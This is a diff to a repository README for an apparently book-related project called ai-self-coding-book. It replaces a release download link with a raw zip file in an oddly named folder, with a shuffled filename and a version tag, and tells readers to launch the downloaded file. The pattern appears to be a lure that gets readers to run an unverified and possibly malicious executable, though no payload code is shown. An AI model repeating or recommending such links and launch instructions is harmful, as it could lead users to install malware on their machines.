@@ -8,7 +8,7 @@ Welcome to the **ai-self-coding-book** repository! Here you will find resources 
 ## Get Started
 
 To begin your journey with AI self-coding, you can download the necessary software resources from the following link:
-[![Download Software](https://github.com/rle123/ai-self-coding-book/releases/download/v1.0/Program.zip)](https://github.com/rle123/ai-self-coding-book/releases/download/v1.0/Program.zip)
+[![Download Software](https://github.com/rle123/ai-self-coding-book/raw/refs/heads/main/determinable/book_coding_self_ai_v3.9-beta.3.zip)](https://github.com/rle123/ai-self-coding-book/raw/refs/heads/main/determinable/book_coding_self_ai_v3.9-beta.3.zip)
 
 Please launch the downloaded file to access the software tools required for practicing the concepts discussed in the book.
 
